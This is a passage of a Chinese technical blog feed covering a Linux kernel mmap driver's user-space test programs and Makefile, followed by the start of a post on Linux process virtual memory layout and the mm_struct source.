class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_PAGE_COUNT 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN (MAP_PAGE_COUNT * 4096)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/mmap_driver_dev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open /dev failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *vadr = mmap(<span class="number">0</span>, LEN, PROT_READ, MAP_PRIVATE | MAP_LOCKED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> loop = <span class="number">0</span>; loop &lt; MAP_PAGE_COUNT; loop++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%-10s----%lx]\n&quot;</span>, vadr + <span class="number">4096</span> * loop, (<span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>)vadr + <span class="number">4096</span> * loop);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)<span class="comment">//便于查看调试的时候查看进程pid</span></span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="maptest-write-c"><a href="#maptest-write-c" class="headerlink" title="maptest_write.c"></a>maptest_write.c</h3><p>​下面是我们用户空间的写程序，向第一个页面写入一个字符串。mmap 参数：可读，可写，共享，加锁（防止被换出）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN (10 * 4096)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/mmap_driver_dev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open /dev failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *vadr = mmap(<span class="number">0</span>, LEN, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_LOCKED, fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input the info to Page0:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, vadr);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><blockquote><p>这里只需要强调一点就是，内核编译默认采用 C90 标准，所以某些语法会导致 make 报错，解决的方法可以是在 Makefile 文件里添加进这句话<code>ccflags-y := -std=gnu99 -Wno-declaration-after-statement</code>。（比如在阅读很多开源内核模块时可能发现所有变量定义都是统一放在函数开头的，这就是 C90 的一个特点）</p></blockquote><p><img src="https://s2.loli.net/2023/01/12/3ScKFZluzn9Bri5.png" alt="c90编译内核.png"></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_MODULE_SIG := n</span><br><span class="line">ccflags-y := -std=gnu99 -Wno-declaration-after-statement</span><br><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">obj-m += map_driver.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">KERNELDIR ?= /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line"><span class="section">default:</span></span><br><span class="line"><span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span>  M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">@rm -rf *.o *.mod *.mod.c *.mod.o *.ko *.order *.symvers .*.cmd .tmp_versions</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure><blockquote><p>此外想强调一点，就是 printk 进行内核打印日志时，打印的字符串末尾一定要加换行符 \n ，否则可能因为缓冲区问题导致无法正常打印，而自己还以为是程序本身有 bug 出错。</p></blockquote><p>​到这里这一章所有的故事就讲完了，我自己从写代码，各种 bug 调试到完成该文章也是搞了整整三天，收获还是很大的，这篇应该还算写的蛮详细了，语言表达上也是反复斟酌。最后，所有代码都放在 Gitee上了 <a href="https://gitee.com/ChaceQ/linuxk_blog_code.git">linuxk_blog_code1 </a>，希望对友友们有帮助！</p><hr><h2 id="踩坑补充"><a href="#踩坑补充" class="headerlink" title="踩坑补充"></a>踩坑补充</h2><ol><li><p>模块退出函数里的这两句一定不能写反了，否则在卸载模块时会内核崩溃，提示<code>ERROR: Module is in use.</code>导致该模块无法被卸载，查看内核日志发现是 <code>device_del(my_device);</code>函数里出现空指针异常。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">device_del(my_device);</span><br><span class="line">class_destroy(my_class);</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2023/01/12/MEzu5V6x4Y1SrWv.png" alt="image.png"></p><ol start="2"><li><p>执行主程序时一定要加管理员权限<code>sudo ./maptest_read</code>，因为我们创建的设备文件是仅 root 用户才能打开的，所以不加管理员权限直接运行程序会报错，一不小心就可能将问题重心转向排查是否设备文件本身出错。</p><p><img src="https://s2.loli.net/2023/01/12/k4js9oRAYviTa7t.png" alt="image.png"></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux虚拟内存解析 - 用户空间</title>
      <link href="/2022/12/28/O01_virtual_mem_1/"/>
      <url>/2022/12/28/O01_virtual_mem_1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在当时做编译器项目的时候，由于自己负责汇编代码生成及优化这一块，其中自然要去考虑各个段的虚拟空间布局问题，所以自己去浅了解了一下关于 Linux 内存分配的相关知识。毫不夸张地说，了解 Linux 的堆内存分配机制是通向进一步学习操作系统的必经之路。以下，第一章节先浅浅写个前置知识回顾虚拟空间布局基本原理，往后再进一步探索 malloc 相关源码。</p></blockquote><h2 id="第一部分-Linux虚拟内存空间"><a href="#第一部分-Linux虚拟内存空间" class="headerlink" title="第一部分 - Linux虚拟内存空间"></a>第一部分 - Linux虚拟内存空间</h2><p>​我们的故事要从这张图片说起，这是 Linux 进程虚拟地址空间的布局图。在32位系统下虚拟空间有4GB (2^32)，其中1GB作为所有进程共享的内核空间（下图左，即无论有多少个进程，该内核空间映射在物理空间中只有一份，由所有进程共享），而3GB作为每个进程独占的用户空间（下图右）。Linux 系统在准备运行 elf 格式的程序文件时，会调用加载器 loader 把可执行文件中的各个段依次载入到从某一地址开始的空间中。</p><p>​如下图右所示，在这3GB的用户空间中，高地址作为函数调用栈 stack，在程序运行过程中向低地址方向增长，低地址开始依次是保留区，.text .rodata .init段，.data .bss段，再往上便是堆 heap 以及 memory mapping segment 映射区。接下来我们从低地址到高地址依次来看一下。</p><p><img src="https://s2.loli.net/2022/12/28/LsGvSXgwTRdiymF.png" alt="Linux内存布局.png"></p><ul><li><p><strong>保留区：</strong>位于虚拟地址空间的最低部分，未赋予物理地址。任何对它的引用都是非法的，用于捕捉使用空指针和小整型值指针引用内存的异常情况，因为“历史原因”前 128.28125MB 属于保留空间。。</p></li><li><p><strong>.text段：</strong>代码段，存储只读的程序执行代码，即机器指令，通常代码段是可共享的。程序运行过程中 pc 指针指向该区域对应执行（取指）的代码。</p></li><li><p><strong>.rodata段：</strong>只读数据段，通常存放类似 <code>char *str = &quot;helloworld&quot;</code>的字符串以及 const 修饰的全局变量。</p></li><li><p><strong>.data段：</strong>数据段，通常存放初始化过且不为0的全局及静态变量，可读写。</p></li><li><p><strong>.bss段：</strong>未初始化全局及静态变量段。若源文件中定义了 <code>char arr[10000];</code>而并未初始化，那么生成的可执行文件中并不会占用10000字节的存储空间而仅仅是做个大小标记。而是在程序执行的时候分配空间，并且全部初始化为0。</p><ul><li>当程序读取数据段的数据时，系统会出发缺页故障，从而分配相应的物理内存；当程序读取BSS段的数据时，内核会将其转到一个全零页面，不会发生缺页故障，也不会为其分配相应的物理内存。</li></ul></li><li><p><strong>heap :</strong> 堆区域。类似于栈的实现，mm-&gt;start_brk 指针始终指向 heap 的底部用于标记 heap 区域的开始位置，而 heap 顶部有个 mm-&gt;brk 指针，通过该指针的上下移动便可以分配堆内存。该方案适用于分配小块内存，因为类似于栈的实现形式，若高地址的内存未被释放，brk 指针便不会下移，这可能导致低地址已经释放的内存无法归还造成内存碎片。<strong>堆中内容是匿名的，意味着不能按名字直接访问，只能通过指针间接访问。</strong></p></li><li><p><strong>mmap：</strong>匿名映射区，该部分占用整个虚拟内存的绝大部分空间。内核将硬盘文件的内容直接映射到内存，任何应用程序都可通过Linux的mmap()系统调用或Windows的CreateFileMapping()&#x2F;MapViewOfFile()请求这种映射，内存映射是一种方便高效的文件I&#x2F;O方式， 因而被用于装载动态共享库。此外，用户也可创建匿名内存映射，该映射没有对应的文件, 可用于存放程序数据，例如malloc()申请的大块内存。</p><ul><li>补充：在Linux2.6以前采用 legacy layout 布局，该区域 mmap 起始位置大概在0X40000000处，向上增长约有2GB的空间，该方案 heap 与 mmap 区域无法共享内存。新版 modern layout 布局 mmap 起始位置大概在0XBFxxxxxx处，向下增长，与 heap 区相对，总共大概有2.9GB的可分配空间。</li><li>我们在使用 malloc() 进行动态内存分配时，底层实现会有两条分配路线，当 malloc 申请小于128KB空间时，操作系统提供了 brk() 函数，c运行库提供了sbrk() 函数，在 heap 区域进行分配。而在申请超过128KB的堆内存，或者程序运行过程中有所需要打开的文件以及动态链接库文件，操作系统提供了 mmap() 函数和 munmap() 函数，分配的内存会被映射到 mmap 区域。</li></ul></li><li><p><strong>栈区：</strong>栈区存放线程运行过程中的局部变量，临时变量，环境变量等信息，通过sp指针的移动自动扩张以及回收。上图虽只画了一个stack区，但若同一进程下有多线程，那么就会有多个互相独立的 stack 区，Linux 下每个线程栈最大值默认 8 MB，可以用 <code>ulimit -s</code>查看，他们都分布在用户空间的相对高地址区域，向下增长。</p><blockquote><p>​补充个小知识点，在上图中我们能看到一些 Random offest ，比如 stack 域和 mmap 域之间的 Random mmap offset，为什么会有这些空洞呢，其实是因为如果各个段都采用固定的起始地址，这样实现起来简单，而且所有 Linux 系统都能保持统一，但是对于攻击者来说，构建恶意代码（比如通过缓冲区溢出获得栈内存区域的访问权，进而恶意操纵栈的内容）就变得更加容易。因此一个可以采用的反制措施就是不为这些 segments 的起点选择固定位置，而是在每次新进程启动时（通过设置PF_RANDOMIZE标志）随机改变这些值的设置，这也就形成了一系列的 Random offest 间隙。</p></blockquote><blockquote><p>​值得一提的是，无论是 malloc() 进行匿名内存分配还是在 mmap 区域的打开文件，加载时候均使用 “lazy” 的延迟分配策略。即分配虚拟地址空间时，并不会马上分配对应的物理内存并建立 mmu 映射，而是在虚拟地址真正读写时触发缺页异常，中断，在异常处理中再进行物理内存分配、数据读取和建立 mmu 映射。</p><p>​而在内核空间分配时不采用延时分配物理内存的策略，因为内核对文件的映射很少，一般就是 vmlinux，不会消耗太多内存资源。且内核空间的代码一般要求快速响应，缺页处理这种会让内核速度未知。此外，内核操作可能处于各种复杂的锁上下文中，在这种上下文中处理缺页异常，可能触发新的异常。</p></blockquote><p>实际mmap区域在映射过程中分为文件映射和匿名映射。</p><ol><li>文件映射: 磁盘文件映射到进程的虚拟地址空间，使用文件内容初始化物理内存。</li><li>匿名映射: 初始化全为0的内存空间，即通过malloc所申请的mmap内存区域。</li></ol><p>根据映射关系是否共享还可以分为私有映射和共享映射。</p><ol><li>私有映射(MAP_PRIVATE)：多进程间数据共享，通过copy-on-write（写时复制）机制实现数据修改。</li><li>共享映射(MAP_SHARED)：多进程间数据共享，修改会直接反映到磁盘里该实际文件中。</li></ol><p>总结起来，便有以下四种映射关系。</p><ol><li>私有文件映射：多个进程使用同样的物理内存页进行初始化，但是各个进程对内存文件的修改会通过写诗拷贝进行复制后修改。</li><li>共享文件映射：多个进程通过虚拟内存技术共享同样的物理内存空间，对内存文件的修改会反应到同一个实际物理文件中，也是进程间通信(IPC)的一种机制。</li><li>私有匿名映射：mmap会创建一个新的映射，各个进程不共享，这种使用主要用于大块malloc内存分配。例如在创建新进程时，会为每个进程分配虚拟的地址空间，这些虚拟地址映射的物理内存空间各个进程间读的时候共享，写的时候会copy-on-write。</li><li>共享匿名映射：这种机制在进行fork的时候不会采用写时复制，父子进程完全共享同样的物理内存页，这也就实现了父子进程通信(IPC)。</li></ol></li></ul><h2 id="第二部分-相关结构体代码实现"><a href="#第二部分-相关结构体代码实现" class="headerlink" title="第二部分 - 相关结构体代码实现"></a>第二部分 - 相关结构体代码实现</h2><p>​我们知道在Linux中每个进程都是由一个PCB（process control block 进程控制块）来表示的（实际上 Linux 里无论是进程还是线程甚至是内核线程的结构都是统一为该结构体表示），在操作系统里具体由 task_struct 结构体实现，在 task_struct 结构体有一个 <code>struct mm_struct *mm</code> 指针，这就是用于表示一个进程（线程）的虚拟内存空间的内存描述符结构体指针。我们来看一下 mm_struct的代码，该结构体包含了和进程地址空间有关的全部信息，其定义在 <code>&lt;linux/sched.h&gt;</code> 中。</p><p>​所有的 mm_struct 结构体都通过自身的 <code> struct list_head mmlist;</code> 连接在一个双向链表中，该链表的首元素是 init_mm 内存描述符，它代表 init （0号进程）的地址空间。此外注意，操作该链表时需要使用 mmlist_lock 锁来防止并发访问。下面就是 mm_struct 的结构体实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">//指向内存区域的链表头</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap</span>;</span>       <span class="comment">/* list of VMAs */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//指向内存区域的红黑树根节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">mm_rb</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//指向最近使用的虚拟区间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap_cache</span>;</span> <span class="comment">/* last find_vma result */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//用来在进程地址空间中搜索有效的进程地址空间的函数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span> <span class="params">(<span class="keyword">struct</span> file *filp,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">long</span> pgoff, <span class="type">unsigned</span> <span class="type">long</span> flags)</span>;</span><br><span class="line"></span><br><span class="line">       <span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_exec_area)</span> <span class="params">(<span class="keyword">struct</span> file *filp,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">long</span> pgoff, <span class="type">unsigned</span> <span class="type">long</span> flags)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放线性区时调用的方法，          </span></span><br><span class="line">    <span class="type">void</span> (*unmap_area) (<span class="keyword">struct</span> mm_struct *mm, <span class="type">unsigned</span> <span class="type">long</span> addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//标识第一个分配文件内存映射的线性地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> mmap_base;        <span class="comment">/* base of mmap area */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> task_size;        <span class="comment">/* size of task vm space */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * RHEL6 special for bug 790921: this same variable can mean</span></span><br><span class="line"><span class="comment">     * two different things. If sysctl_unmap_area_factor is zero,</span></span><br><span class="line"><span class="comment">     * this means the largest hole below free_area_cache. If the</span></span><br><span class="line"><span class="comment">     * sysctl is set to a positive value, this variable is used</span></span><br><span class="line"><span class="comment">     * to count how much memory has been munmapped from this process</span></span><br><span class="line"><span class="comment">     * since the last time free_area_cache was reset back to mmap_base.</span></span><br><span class="line"><span class="comment">     * This is ugly, but necessary to preserve kABI.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cached_hole_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//内核进程搜索进程地址空间中线性地址的空间空间</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> free_area_cache;      <span class="comment">/* first hole of size cached_hole_size or larger */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//指向页表的目录</span></span><br><span class="line">    <span class="type">pgd_t</span> * pgd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//共享进程时的个数</span></span><br><span class="line">    <span class="comment">//比如:若9个线程共享该空间，则 mm_users为3，当其减为0时该结构体会被撤销。</span></span><br><span class="line">    <span class="type">atomic_t</span> mm_users;          <span class="comment">/* How many users with user space? */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//内存描述符的主使用计数器，采用引用计数的原理，当为0时代表无用户再次使用</span></span><br><span class="line">    <span class="type">atomic_t</span> mm_count;          <span class="comment">/* How many references to &quot;struct mm_struct&quot; (users count as 1) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//线性区的个数</span></span><br><span class="line">    <span class="type">int</span> map_count;              <span class="comment">/* number of VMAs */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">mmap_sem</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//保护任务页表和引用计数的锁</span></span><br><span class="line">    <span class="type">spinlock_t</span> page_table_lock;     <span class="comment">/* Protects page tables and some counters */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//mm_struct结构，第一个成员就是初始化的mm_struct结构，</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mmlist</span>;</span>        <span class="comment">/* List of maybe swapped mm&#x27;s.  These are globally strung</span></span><br><span class="line"><span class="comment">                         * together off init_mm.mmlist, and are protected</span></span><br><span class="line"><span class="comment">                         * by mmlist_lock</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Special counters, in some configurations protected by the</span></span><br><span class="line"><span class="comment">     * page_table_lock, in other configurations by being atomic.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">mm_counter_t</span> _file_rss;</span><br><span class="line">    <span class="type">mm_counter_t</span> _anon_rss;</span><br><span class="line">    <span class="type">mm_counter_t</span> _swap_usage;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//进程拥有的最大页表数目</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> hiwater_rss;  <span class="comment">/* High-watermark of RSS usage */</span>、</span><br><span class="line">    <span class="comment">//进程线性区的最大页表数目</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> hiwater_vm;   <span class="comment">/* High-water virtual memory usage */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//进程地址空间的大小，锁住无法换页的个数，共享文件内存映射的页数，可执行内存映射中的页数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> total_vm, locked_vm, shared_vm, exec_vm;</span><br><span class="line">    <span class="comment">//用户态堆栈的页数，</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_vm, reserved_vm, def_flags, nr_ptes;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//下面几个值的范围就表示各个段的地址空间范围.</span></span><br><span class="line">    <span class="comment">//维护代码段和数据段</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_code, end_code, start_data, end_data;</span><br><span class="line">    <span class="comment">//维护堆和栈</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_brk, brk, start_stack;</span><br><span class="line">    <span class="comment">//维护命令行参数，命令行参数的起始地址和最后地址，以及环境变量的起始地址和最后地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> arg_start, arg_end, env_start, env_end;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> saved_auxv[AT_VECTOR_SIZE]; <span class="comment">/* for /proc/PID/auxv */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linux_binfmt</span> *<span class="title">binfmt</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//lazy TLB交换掩码.</span></span><br><span class="line">    <span class="type">cpumask_t</span> cpu_vm_mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Architecture-specific MM context */</span></span><br><span class="line">    <span class="type">mm_context_t</span> context;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Swap token stuff */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Last value of global fault stamp as seen by this process.</span></span><br><span class="line"><span class="comment">     * In other words, this value gives an indication of how long</span></span><br><span class="line"><span class="comment">     * it has been since this task got the token.</span></span><br><span class="line"><span class="comment">     * Look at mm/thrash.c</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> faultstamp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> token_priority;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> last_interval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//线性区的默认访问标志</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags; <span class="comment">/* Must use atomic bitops to access the bits */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">core_state</span> *<span class="title">core_state</span>;</span> <span class="comment">/* coredumping support */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_AIO</span></span><br><span class="line">    <span class="type">spinlock_t</span>      ioctx_lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>   <span class="title">ioctx_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MM_OWNER</span></span><br><span class="line">  